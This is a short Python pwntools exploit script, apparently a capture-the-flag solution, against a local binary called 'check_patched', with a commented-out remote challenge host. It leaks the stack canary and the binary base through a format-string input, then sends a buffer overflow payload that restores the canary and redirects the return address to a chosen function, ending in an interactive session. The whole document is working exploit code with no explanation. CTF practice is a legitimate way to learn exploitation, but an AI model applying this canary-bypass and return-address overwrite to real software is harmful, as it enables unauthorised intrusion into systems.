from pwn import *

#offset - 23,45 - 0x2a28b,29 - 0x11a9

elf = context.binary = ELF("./check_patched")
libc = elf.libc

# context.log_level = 'Debug'

gs = '''
breakrva 0x1250
'''

def conn():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    else:
        return process([elf.path])
    return r

p = conn()
# p = remote("anveshanam.net",10483)
p.sendline(b"%23$p %29$p")
p.recv(27)
canary = int(p.recvuntil(" ").strip(),16)
elf.address = int(p.recvline().strip(),16) - 0x11a9

print(f"Canary : {hex(canary)}")
print(f"Bin_Base : {hex(elf.address)}")

payload = b"A"*136
payload += p64(canary)
payload += b"A"*8
payload += p64(elf.address + 0x1250)


p.sendline(payload)


p.interactive()